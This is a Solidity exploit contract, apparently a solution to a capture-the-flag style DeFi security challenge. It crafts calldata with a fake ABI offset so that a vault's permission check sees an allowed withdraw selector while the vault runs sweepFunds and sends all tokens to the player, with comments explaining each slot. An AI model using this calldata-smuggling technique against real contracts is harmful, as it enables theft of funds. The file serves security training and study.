// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SelfAuthorizedVault.sol";

contract AttackA {
  SelfAuthorizedVault immutable vault;
  address immutable DVT;
  address immutable player;

  constructor (address _vault, address _DVT, address _player) {
    vault = SelfAuthorizedVault(_vault);
    DVT = _DVT;
    player = _player;
  }

  function kek() public view returns (bytes memory) {
    bytes4 executeSelector = bytes4(keccak256("execute(address,bytes)"));
    bytes32 fakeOffset = bytes32(uint256(100));
    bytes32 emptySlot = bytes32(uint256(69));
    bytes4 withdrawSelector = bytes4(keccak256("withdraw(address,address,uint256)"));
    bytes32 codeSize = bytes32(uint256(32*2+4));
    bytes4 sweepSelector = bytes4(keccak256("sweepFunds(address,address)"));

    bytes memory encodedParams = abi.encodePacked(
      executeSelector,
      abi.encode(address(vault)), // turns 'address' to 'bytes32'
      fakeOffset,
      emptySlot,
      withdrawSelector,
      codeSize,
      sweepSelector,
      abi.encode(player),
      abi.encode(DVT)
    );

    return encodedParams;
  }
}

/*

Slots of calldata:
1. executeSelector - to call 'execute' from AuthorizedExecutor.sol
2. vault - 'target' from 'execute'
3. fakeOffset - skips 100 bytes to the codeSize slot 
   100 = 32*3+4 - skips slots 2-5, the first slot is already skipped
4. emptySlot - can be anything, but we need it for the fifth slot
5. withdrawSelector - have to be in this slot to 'permissions' return 'true'
6. codeSize - the size of 'sweepFunds' call: 2 addresses + selector
7. sweepSelector - to call 'sweepFunds' from SelfAuthorizedVault.sol
8. receiver
9. token

*/
